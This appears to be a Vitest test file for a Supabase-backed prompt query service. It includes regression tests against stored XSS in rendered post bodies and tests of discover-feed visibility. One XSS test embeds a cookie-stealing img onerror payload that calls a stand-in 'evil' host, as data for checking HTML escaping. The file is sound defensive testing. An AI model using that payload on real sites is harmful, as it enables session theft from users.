import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SupabasePromptQueryService } from './prompt-query.js';

/**
 * Regression tests for the body_html rendering path.
 *
 * Previously getPromptDetail had an unescaped fallback that interpolated
 * user-authored plain text into `<p>${p}</p>`. That value reaches {@html}
 * in the conversation detail page, so a malicious TipTap JSON that caused
 * renderTiptapToHtml to throw or return empty opened stored XSS.
 *
 * These tests lock in:
 * - The fallback is gone.
 * - renderTiptapToHtml output is the only path that can populate body_html.
 *   The renderer is safe by construction: hardcoded tag allowlist, every
 *   text node and attribute value HTML-escaped, every URL validated against
 *   `SAFE_URL_PROTOCOL`.
 * - Empty/error cases produce an empty string, never a raw fallback.
 */
describe('SupabasePromptQueryService.getPromptDetail — body_html', () => {
	// Chainable mock where every query method returns the chain. Terminal
	// methods (single / maybeSingle) resolve with the stored payload, and the
	// chain itself is thenable to model PostgREST's `await query` pattern.
	function chainWith(data: unknown) {
		const chain: Record<string, unknown> = {};
		Object.assign(chain, {
			select: () => chain,
			eq: () => chain,
			in: () => chain,
			order: () => chain,
			limit: () => chain,
			single: async () => ({ data, error: null }),
			maybeSingle: async () => ({ data, error: null }),
			then: (cb: (v: { data: unknown; error: null }) => unknown) =>
				cb({ data, error: null })
		});
		return chain;
	}

	function mockSupabase(prompt: unknown, slots: unknown[] = [], profiles: unknown[] = []) {
		return {
			from(table: string) {
				if (table === 'prompts') return chainWith(prompt);
				if (table === 'time_slots_public') return chainWith(slots);
				if (table === 'profiles') return chainWith(profiles);
				throw new Error(`unexpected table: ${table}`);
			}
		};
	}

	beforeEach(() => {
		vi.spyOn(console, 'error').mockImplementation(() => {});
	});

	it('renders well-formed TipTap JSON through the sanitized pipeline', async () => {
		const body = {
			type: 'doc',
			content: [
				{ type: 'paragraph', content: [{ type: 'text', text: 'Hello, world.' }] }
			]
		};
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		expect(detail?.body_html).toContain('Hello, world.');
		expect(detail?.body_html).toContain('<p>');
	});

	it('returns empty body_html for an empty doc — no unescaped fallback string', async () => {
		const body = { type: 'doc', content: [] };
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		// Empty doc may produce an empty paragraph, but no raw ${...} interpolation
		expect(detail?.body_html ?? '').not.toMatch(/\$\{/);
		expect(detail?.body_html ?? '').not.toMatch(/undefined/);
	});

	it('never surfaces raw `<img onerror=...>` from text nodes', async () => {
		const attack = "<img src=x onerror=fetch('https://evil/'+document.cookie)>";
		const body = {
			type: 'doc',
			content: [
				{ type: 'paragraph', content: [{ type: 'text', text: attack }] }
			]
		};
		const supa = mockSupabase(
			{ id: 'p1', author_id: 'u1', state: 'published', body, title: 't', cover_image_url: null, published_at: '2026-01-01', region: 'berlin' },
			[],
			[{ user_id: 'u1', username: 'alice', display_name: null }]
		);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const detail = await svc.getPromptDetail('p1', 'viewer');
		// TipTap escapes text nodes: `<` and `>` become `&lt;` and `&gt;`, so the
		// browser treats the content as plain text, not HTML. The attack string
		// surviving as TEXT is fine; what matters is that no raw `<img>` tag is
		// emitted that would be parsed as HTML and fire the onerror handler.
		expect(detail?.body_html).toContain('&lt;img');
		expect(detail?.body_html).not.toMatch(/<img[\s>]/);
		// The renderer's hardcoded tag allowlist contains no `on*` attribute
		// names; if a future change ever lets one through, this assertion
		// catches it.
		expect(detail?.body_html).not.toMatch(/<[a-z]+\s[^>]*onerror=/i);
	});
});

/**
 * Regression tests for discover visibility (prod incident: existing
 * conversations vanished from /discover + map).
 *
 * Visibility is TIME-bounded only — a conversation with an upcoming, non-expired
 * slot stays on the feed even when that slot is FULL (capacity reached). The old
 * code additionally dropped full slots via the occupancy RPC, which could hide a
 * whole conversation. These lock in: full-but-upcoming stays; all-past still
 * drops; the discover feed never consults the occupancy RPC.
 */
describe('SupabasePromptQueryService.getPublishedPrompts — time-bounded visibility', () => {
	function chain(data: unknown) {
		const c: Record<string, unknown> = {};
		Object.assign(c, {
			select: () => c,
			eq: () => c,
			is: () => c,
			or: () => c,
			in: () => c,
			order: () => c,
			limit: () => c,
			lt: () => c,
			then: (cb: (v: { data: unknown; error: null }) => unknown) => cb({ data, error: null })
		});
		return c;
	}
	function mockSupabase(prompts: unknown[], slots: unknown[], profiles: unknown[]) {
		return {
			from(table: string) {
				if (table === 'prompts') return chain(prompts);
				if (table === 'time_slots_public') return chain(slots);
				if (table === 'profiles') return chain(profiles);
				throw new Error(`unexpected table: ${table}`);
			},
			rpc() {
				throw new Error('discover feed must not call the occupancy RPC');
			}
		};
	}

	beforeEach(() => {
		vi.spyOn(console, 'error').mockImplementation(() => {});
	});

	const slot = (promptId: string, startTime: string) => ({
		id: `slot-${promptId}`,
		prompt_id: promptId,
		start_time: startTime,
		duration_minutes: 60,
		general_area: 'Mitte',
		general_area_lat: 52.5,
		general_area_lng: 13.4,
		accepted: true,
		created_at: '2026-01-01T00:00:00Z',
		retired_at: null
	});
	const prompt = (id: string) => ({
		id,
		author_id: 'a1',
		title: 'Conversation',
		body: null,
		cover_image_url: null,
		published_at: '2026-01-01T00:00:00Z',
		region: 'berlin',
		audience_scope: null,
		capacity: 1
	});
	const profiles = [{ id: 'a1', username: 'alice', display_name: null }];

	it('keeps a conversation whose only upcoming slot is FULL (capacity reached)', async () => {
		const start = new Date(Date.now() + 48 * 60 * 60 * 1000).toISOString(); // +48h, past the 12h cutoff
		const supa = mockSupabase([prompt('p1')], [slot('p1', start)], profiles);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const result = await svc.getPublishedPrompts({ region: 'berlin', userId: 'viewer', scopes: [] });
		expect(result).toHaveLength(1);
		expect(result[0].id).toBe('p1');
		expect(result[0].available_slots).toHaveLength(1);
		expect(result[0].soonest_slot).toBe(start);
	});

	it('still drops a conversation whose slots are all in the past (time-bounded)', async () => {
		const start = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
		const supa = mockSupabase([prompt('p2')], [slot('p2', start)], profiles);
		// @ts-expect-error test-only shape
		const svc = new SupabasePromptQueryService(supa);
		const result = await svc.getPublishedPrompts({ region: 'berlin', userId: 'viewer', scopes: [] });
		expect(result).toHaveLength(0);
	});
});
